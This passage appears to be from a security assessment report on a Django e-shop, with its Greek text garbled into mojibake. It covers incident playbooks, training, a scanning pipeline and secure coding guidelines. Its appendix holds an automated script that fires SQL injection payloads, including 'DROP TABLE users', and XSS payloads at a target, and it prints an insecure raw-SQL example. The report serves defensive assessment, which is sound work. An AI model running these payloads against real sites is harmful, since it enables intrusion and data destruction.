### 6.1 SQL Injection Response

```yaml
playbook: SQL_Injection_Response
severity: Critical
sla: 1_hour

steps:
  1_detect:
    - Monitor for UNION, SELECT, DROP in logs
    - Alert on 500 errors spike
    - Check WAF alerts
    
  2_contain:
    - Block attacking IPs
    - Enable WAF emergency rules
    - Disable affected endpoints
    
  3_eradicate:
    - Deploy parameterized queries
    - Review all SQL code
    - Update and test
    
  4_recover:
    - Restore from clean backup
    - Reset all credentials
    - Re-enable services
    
  5_lessons:
    - Update secure coding guide
    - Mandatory security training
    - Implement code scanning
```

### 6.2 Communication Templates

**Customer Notification**:
```
Î‘Î³Î±Ï€Î·Ï„Î­ Ï€ÎµÎ»Î¬Ï„Î·,

Î•Î½Ï„Î¿Ï€Î¯ÏƒÎ±Î¼Îµ ÎºÎ±Î¹ Î´Î¹Î¿ÏÎ¸ÏÏƒÎ±Î¼Îµ Î­Î½Î± Î¸Î­Î¼Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î¬ Î¼Î±Ï‚. 
Î©Ï‚ Ï€ÏÎ¿Î»Î·Ï€Ï„Î¹ÎºÏŒ Î¼Î­Ï„ÏÎ¿, ÏƒÎ±Ï‚ ÏƒÏ…Î½Î¹ÏƒÏ„Î¿ÏÎ¼Îµ Î½Î±:

1. Î‘Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚
2. Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¹Ï‚ Ï€ÏÏŒÏƒÏ†Î±Ï„ÎµÏ‚ ÏƒÏ…Î½Î±Î»Î»Î±Î³Î­Ï‚ ÏƒÎ±Ï‚
3. Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ 2FA

Î“Î¹Î± ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚: security@company.gr
```

---

## 7. Security Awareness Training Program

### 7.1 Developer Security Training

| Module | Duration | Topics | Certification |
|--------|----------|---------|---------------|
| Secure Coding | 16h | OWASP Top 10, Django Security | Required |
| Threat Modeling | 8h | STRIDE, Attack Trees | Required |
| Security Testing | 12h | SAST, DAST, Penetration Testing | Optional |
| Incident Response | 4h | Playbooks, Communication | Required |

### 7.2 Security Champions Program

```python
class SecurityChampion:
    """Embedded security expert in dev team"""
    
    responsibilities = [
        "Code review for security",
        "Threat modeling participation",
        "Security tool integration",
        "Team security training",
        "Incident response support"
    ]
    
    training_path = {
        "month_1": ["OWASP Top 10", "Secure Coding"],
        "month_2": ["Threat Modeling", "Security Tools"],
        "month_3": ["Penetration Testing Basics"],
        "ongoing": ["Monthly security updates", "Conference attendance"]
    }
    
    kpis = {
        "vulnerabilities_prevented": "target: 50/year",
        "security_reviews": "target: 100% coverage",
        "training_delivered": "target: 4 sessions/year"
    }
```

---

## 8. Automated Security Integration

### 8.1 CI/CD Security Pipeline

```yaml
name: Security Pipeline
on: [push, pull_request]

jobs:
  security_scan:
    runs-on: ubuntu-latest
    steps:
      - name: SAST Scan
        uses: securego/gosec@latest
        with:
          args: ./...
          
      - name: Dependency Check
        uses: jeremylong/DependencyCheck@latest
        with:
          project: 'e-shop'
          scan: './'
          
      - name: Secret Scanning
        uses: trufflesecurity/trufflehog@latest
        with:
          path: ./
          
      - name: DAST Scan
        run: |
          docker run -t owasp/zap2docker-stable zap-baseline.py \
            -t http://localhost:8000 -r zap_report.html
            
      - name: Container Scan
        uses: aquasecurity/trivy-action@latest
        with:
          image-ref: 'e-shop:latest'
```

### 8.2 Security Metrics Dashboard

```python
# metrics_collector.py
class SecurityMetrics:
    def __init__(self):
        self.metrics = {
            "mttr": [],  # Mean Time To Remediate
            "vulnerability_density": [],  # Vulns per KLOC
            "false_positive_rate": [],
            "coverage": {
                "sast": 0,
                "dast": 0,
                "dependencies": 0
            }
        }
    
    def calculate_risk_score(self):
        """Calculate overall application risk score"""
        weights = {
            "critical_vulns": 0.4,
            "high_vulns": 0.3,
            "compliance": 0.2,
            "security_debt": 0.1
        }
        
        score = sum(
            self.get_metric(metric) * weight 
            for metric, weight in weights.items()
        )
        
        return min(100, score)  # 0-100 scale
```

---

## 9. Advanced Recommendations

### 9.1 Zero Trust Architecture

```mermaid
graph TB
    A[User] -->|Authenticate| B[Identity Provider]
    B -->|Token| C[API Gateway]
    C -->|Authorize| D[Policy Engine]
    D -->|Allow/Deny| E[Microservice]
    E -->|Encrypt| F[Database]
    
    G[Monitoring] -->|Analyze| C
    G -->|Alert| H[SIEM]
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style D fill:#ff9,stroke:#333,stroke-width:2px
    style H fill:#9ff,stroke:#333,stroke-width:2px
```

### 9.2 Security Maturity Model

| Level | Description | Current | Target | Actions |
|-------|-------------|---------|--------|---------|
| 1 | Ad-hoc | âœ“ | | Basic controls |
| 2 | Managed | | | Policies, training |
| 3 | Defined | | âœ“ | Standardized processes |
| 4 | Quantified | | | Metrics-driven |
| 5 | Optimizing | | | Continuous improvement |

### 9.3 Threat Intelligence Integration

```python
class ThreatIntelligence:
    """Integrate threat feeds for proactive defense"""
    
    def __init__(self):
        self.feeds = [
            "https://rules.emergingthreats.net/",
            "https://www.cisa.gov/known-exploited-vulnerabilities",
            "https://nvd.nist.gov/feeds/",
            "Custom industry feeds"
        ]
        
    def check_indicators(self, logs):
        """Check logs against threat indicators"""
        iocs = self.get_latest_iocs()
        
        alerts = []
        for log_entry in logs:
            for ioc in iocs:
                if self.matches_ioc(log_entry, ioc):
                    alerts.append({
                        "severity": ioc.severity,
                        "description": ioc.description,
                        "mitigation": ioc.mitigation,
                        "log_entry": log_entry
                    })
        
        return alerts
```

---

## 10. Î£Ï…Î¼Ï€ÎµÏÎ¬ÏƒÎ¼Î±Ï„Î± ÎºÎ±Î¹ Î•Ï€ÏŒÎ¼ÎµÎ½Î± Î’Î®Î¼Î±Ï„Î±

### 10.1 Executive Summary

Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® E-Shop Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ **ÎºÏÎ¯ÏƒÎ¹Î¼Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚** Î¼Îµ:
- **5 ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï€Î»Î®ÏÎ· compromise
- **â‚¬6.5M+ ÎµÏ„Î®ÏƒÎ¹Î¿ ÏÎ¯ÏƒÎºÎ¿** Î±Ï€ÏŒ breaches ÎºÎ±Î¹ Ï€ÏÏŒÏƒÏ„Î¹Î¼Î±
- **97% ROI** Î±Ï€ÏŒ security investments
- **24-48 ÏÏÎµÏ‚** Î³Î¹Î± critical patches

### 10.2 Prioritized Action Plan

#### Immediate (0-48 hours)
1. â˜ Deploy emergency patches
2. â˜ Enable WAF rules
3. â˜ Reset all credentials
4. â˜ Notify stakeholders

#### Short-term (1-4 weeks)
1. â˜ Complete security audit
2. â˜ Implement monitoring
3. â˜ Staff training
4. â˜ Process updates

#### Long-term (1-6 months)
1. â˜ Security architecture redesign
2. â˜ DevSecOps implementation
3. â˜ Compliance certification
4. â˜ Continuous improvement

### 10.3 Success Metrics

```python
# Track remediation progress
success_metrics = {
    "vulnerabilities_fixed": "5/5 critical",
    "time_to_patch": "<48 hours",
    "security_training": "100% staff",
    "compliance_score": ">95%",
    "risk_reduction": ">90%",
    "roi_achieved": ">500%"
}
```

---

## Î Î±ÏÎ±ÏÏ„Î®Î¼Î±Ï„Î±

### Î Î±ÏÎ¬ÏÏ„Î·Î¼Î± Î‘: Exploit Automation Framework

```python
#!/usr/bin/env python3
"""
E-Shop Exploitation Framework
Educational purposes only!
"""

import argparse
import requests
from colorama import init, Fore
import time
import json

init(autoreset=True)

class EShopExploiter:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def banner(self):
        print(Fore.RED + """
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘   E-Shop Exploitation Framework v2.0  â•‘
        â•‘      Educational Purpose Only!        â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(Fore.YELLOW + "[*] Testing SQL Injection...")
        
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "'; DROP TABLE users--"
        ]
        
        for payload in payloads:
            try:
                start = time.time()
                r = self.session.get(f"{self.target}/catalog/?q={payload}")
                elapsed = time.time() - start
                
                if "error" in r.text.lower() or elapsed > 4:
                    print(Fore.GREEN + f"[+] SQL Injection found with: {payload}")
                    self.vulnerabilities.append({
                        "type": "SQL Injection",
                        "endpoint": "/catalog/",
                        "payload": payload,
                        "severity": "CRITICAL"
                    })
                    break
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                
    def test_xss(self):
        """Test for XSS vulnerabilities"""
        print(Fore.YELLOW + "[*] Testing Cross-Site Scripting...")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                r = self.session.get(f"{self.target}/catalog/?q={payload}")
                
                if payload in r.text:
                    print(Fore.GREEN + f"[+] XSS found with: {payload}")
                    self.vulnerabilities.append({
                        "type": "Cross-Site Scripting",
                        "endpoint": "/catalog/",
                        "payload": payload,
                        "severity": "HIGH"
                    })
                    break
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                
    def test_authentication(self):
        """Test authentication vulnerabilities"""
        print(Fore.YELLOW + "[*] Testing Authentication Weaknesses...")
        
        # Test user enumeration
        users = ['admin', 'nonexistent_user_12345']
        responses = {}
        
        for user in users:
            try:
                r = self.session.post(f"{self.target}/login/",
                                     data={'username': user, 'password': 'wrong'})
                responses[user] = r.text
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                
        if len(set(responses.values())) > 1:
            print(Fore.GREEN + "[+] User enumeration vulnerability found")
            self.vulnerabilities.append({
                "type": "User Enumeration",
                "endpoint": "/login/",
                "description": "Different error messages for valid/invalid users",
                "severity": "MEDIUM"
            })
            
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        print(Fore.YELLOW + "[*] Testing Insecure Direct Object Reference...")
        
        # This would require authentication
        print(Fore.CYAN + "[!] IDOR testing requires authentication - skipping")
        
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        print(Fore.YELLOW + "[*] Testing Cross-Site Request Forgery...")
        
        # Check if endpoints have CSRF protection
        endpoints = ['/transfer-credits/', '/update-email/']
        
        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.target}{endpoint}")
                
                if 'csrf' not in r.text.lower():
                    print(Fore.GREEN + f"[+] Possible CSRF vulnerability at: {endpoint}")
                    self.vulnerabilities.append({
                        "type": "CSRF",
                        "endpoint": endpoint,
                        "description": "No CSRF token found",
                        "severity": "HIGH"
                    })
            except:
                pass
                
    def generate_report(self):
        """Generate exploitation report"""
        print(Fore.CYAN + "\n" + "="*50)
        print(Fore.CYAN + "EXPLOITATION SUMMARY")
        print(Fore.CYAN + "="*50)
        
        if not self.vulnerabilities:
            print(Fore.GREEN + "[+] No vulnerabilities found (target may be patched)")
            return
            
        for vuln in self.vulnerabilities:
            print(Fore.RED + f"\n[!] {vuln['type']}")
            print(Fore.WHITE + f"    Endpoint: {vuln.get('endpoint', 'N/A')}")
            print(Fore.WHITE + f"    Severity: {vuln['severity']}")
            if 'payload' in vuln:
                print(Fore.WHITE + f"    Payload: {vuln['payload']}")
            if 'description' in vuln:
                print(Fore.WHITE + f"    Details: {vuln['description']}")
                
        # Save to JSON
        with open('exploitation_report.json', 'w') as f:
            json.dump({
                "target": self.target,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "vulnerabilities": self.vulnerabilities
            }, f, indent=2)
            
        print(Fore.GREEN + "\n[+] Report saved to exploitation_report.json")
        
    def run(self):
        """Run all tests"""
        self.banner()
        print(Fore.WHITE + f"[*] Target: {self.target}\n")
        
        self.test_sql_injection()
        self.test_xss()
        self.test_authentication()
        self.test_idor()
        self.test_csrf()
        
        self.generate_report()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="E-Shop Exploitation Framework")
    parser.add_argument("target", help="Target URL (e.g., http://localhost:8000)")
    args = parser.parse_args()
    
    exploiter = EShopExploiter(args.target)
    exploiter.run()
```

### Î Î±ÏÎ¬ÏÏ„Î·Î¼Î± Î’: Security Headers Configuration

```python
# security_headers.py
SECURITY_HEADERS = {
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Content-Security-Policy': """
        default-src 'self';
        script-src 'self' 'unsafe-inline' 'unsafe-eval';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        font-src 'self';
        connect-src 'self';
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
    """.replace('\n', ' ').strip(),
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
}

class SecurityHeadersMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        
        for header, value in SECURITY_HEADERS.items():
            response[header] = value
            
        return response
```

### Î Î±ÏÎ¬ÏÏ„Î·Î¼Î± Î“: Secure Coding Guidelines

```python
"""
Django Secure Coding Guidelines
Version 2.0
"""

# âœ… SECURE: Use Django ORM
from django.db import models

class Product(models.Model):
    name = models.CharField(max_length=200)
    
    @classmethod
    def search(cls, query):
        # Parameterized query - SQL injection safe
        return cls.objects.filter(name__icontains=query)

# âŒ INSECURE: Raw SQL
def insecure_search(query):
    cursor = connection.cursor()
    # NEVER DO THIS!
    cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{query}%'")
    

# âœ… SECURE: Proper authentication
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_protect
from django.contrib.auth.hashers import make_password

@csrf_protect
@ratelimit(key='ip', rate='5/m', method='POST')
def secure_login(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    
    # Generic error message
    error_msg = "Invalid credentials"
    
    user = authenticate(username=username, password=password)
    if user is not None:
        login(request, user)
        return redirect('home')
    else:
        return render(request, 'login.html', {'error': error_msg})


# âœ… SECURE: XSS Prevention
from django.utils.html import escape
from bleach import clean

def secure_view(request):
    user_input = request.GET.get('q', '')
    
    # Auto-escaped in template
    context = {
        'search_query': user_input,  # Will be escaped by Django
        'sanitized': clean(user_input, tags=[], strip=True)
    }
    
    return render(request, 'search.html', context)


# âœ… SECURE: IDOR Prevention
@login_required
def secure_order_view(request, order_id):
    # Check ownership
    order = get_object_or_404(Order, id=order_id, user=request.user)
    return render(request, 'order.html', {'order': order})


# âœ… SECURE: Session configuration
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
SECURE_SSL_REDIRECT = True
CSRF_COOKIE_SECURE = True
```

### Î Î±ÏÎ¬ÏÏ„Î·Î¼Î± Î”: Testing Checklist

```markdown
## Pre-Deployment Security Checklist

### Code Review
- [ ] No raw SQL queries
- [ ] All user input sanitized
- [ ] CSRF protection on all forms
- [ ] Authentication on sensitive endpoints
- [ ] No hardcoded credentials
- [ ] Secure password hashing (Argon2/bcrypt)
- [ ] No debug information in production

### Configuration
- [ ] DEBUG = False
- [ ] SECRET_KEY changed from default
- [ ] ALLOWED_HOSTS properly configured
- [ ] Database credentials secured
- [ ] HTTPS enforced
- [ ] Security headers enabled
- [ ] Session security configured

### Testing
- [ ] SAST scan passed
- [ ] DAST scan completed
- [ ] Dependency vulnerabilities checked
- [ ] Manual penetration test performed
- [ ] Security regression tests pass
- [ ] Performance under security tools verified

### Deployment
- [ ] Secrets in environment variables
- [ ] Logging configured (no sensitive data)
- [ ] Monitoring alerts set up
- [ ] Incident response plan ready
- [ ] Backup and recovery tested
- [ ] Security patches applied
```

---

**Î¤Î­Î»Î¿Ï‚ Î‘Î½Î±Ï†Î¿ÏÎ¬Ï‚ v2.0**

**Î£Ï…Î½Ï„Î¬Ï‡Î¸Î·ÎºÎµ Î±Ï€ÏŒ**: [ÎŸÎÎŸÎœÎ‘]  
**Î—Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î±**: [Î—ÎœÎ•Î¡ÎŸÎœÎ—ÎÎ™Î‘]  
**ÎˆÎ³ÎºÏÎ¹ÏƒÎ·**: _________________

**Î— Î±Î½Î±Ï†Î¿ÏÎ¬ Î±Ï…Ï„Î® Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ Î‘Î¥Î£Î¤Î—Î¡Î‘ Î•ÎœÎ Î™Î£Î¤Î•Î¥Î¤Î™ÎšÎ—**